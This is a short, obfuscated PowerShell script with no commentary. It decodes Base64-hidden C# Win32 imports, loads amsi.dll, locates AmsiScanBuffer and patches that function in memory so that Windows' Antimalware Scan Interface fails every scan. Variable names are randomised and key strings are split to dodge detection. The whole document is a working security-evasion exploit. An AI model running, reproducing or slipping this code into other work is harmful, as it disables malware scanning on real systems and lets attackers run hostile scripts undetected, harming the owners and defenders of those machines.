${f1a12df143b14bda885f174d92b78c26} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA=')))
Add-Type ${f1a12df143b14bda885f174d92b78c26}
${27201269ab094982842d347877fb9672} = [Win32]::LoadLibrary("a" + "m" + "s" + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQAuAGQAbABsAA=='))))
${15b6a55ee33e4195a6379b97bf8e5542} = [Win32]::GetProcAddress(${27201269ab094982842d347877fb9672}, "A" + "m" + "s" + "i" + "S" + "ca" + "n" + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYA'))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBlAHIA'))))
${c7a48401677c47c5b15e416edec03bd0} = 0
[Win32]::VirtualProtect(${15b6a55ee33e4195a6379b97bf8e5542}, [uint32]5, 0x40, [ref]${c7a48401677c47c5b15e416edec03bd0})
${a65b861bb95841829fe0af63289fa54f} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy(${a65b861bb95841829fe0af63289fa54f}, 0, ${15b6a55ee33e4195a6379b97bf8e5542}, 6)